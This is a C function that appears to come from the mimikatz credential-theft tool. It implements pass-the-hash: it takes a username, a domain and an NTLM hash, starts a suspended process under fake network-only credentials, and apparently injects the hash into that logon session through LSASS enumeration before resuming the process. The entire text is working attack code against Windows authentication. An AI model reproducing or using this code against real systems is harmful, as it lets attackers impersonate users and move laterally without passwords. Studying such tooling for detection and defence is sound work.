NTSTATUS kuhl_m_sekurlsa_msv_pth(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
	TOKEN_STATISTICS tokenStats;
	MSV1_0_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, ntlm, FALSE};
	PCWCHAR szRun, szNTLM, pFakeUserName, pFakeLogonDomain;
	DWORD i, j, dwNeededSize;
	HANDLE hToken;
	PROCESS_INFORMATION processInfos;

	if(pFakeUserName = kuhl_m_sekurlsa_msv_pth_makefakestring(argc, argv, L"user", &data.UserName))
	{
		if(pFakeLogonDomain = kuhl_m_sekurlsa_msv_pth_makefakestring(argc, argv, L"domain", &data.LogonDomain))
		{
			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
			{
				kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
				if(wcslen(szNTLM) == (LM_NTLM_HASH_LENGTH * 2))
				{
					for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
					{
						swscanf_s(&szNTLM[i*2], L"%02x", &j);
						ntlm[i] = (BYTE) j;
					}
					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
					kprintf(L"Program\t: %s\n", szRun);
					if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, pFakeUserName, pFakeLogonDomain, L"", &processInfos, FALSE))
					{
						kprintf(
							L"  |  PID  %u\n"
							L"  |  TID  %u\n",
							processInfos.dwProcessId, processInfos.dwThreadId);
						if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
						{
							if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
							{
								kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
								kprintf(L"  \\_ ");
								kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
							} else PRINT_ERROR_AUTO(L"GetTokenInformation");
							CloseHandle(hToken);
						} else PRINT_ERROR_AUTO(L"OpenProcessToken");
						NtResumeProcess(processInfos.hProcess);
						CloseHandle(processInfos.hThread);
						CloseHandle(processInfos.hProcess);
					} else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
				} else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
			} else PRINT_ERROR(L"Missing argument : ntlm\n");
			LocalFree((HLOCAL) pFakeLogonDomain);
		}
		LocalFree((HLOCAL) pFakeUserName);
	}
	return STATUS_SUCCESS;
}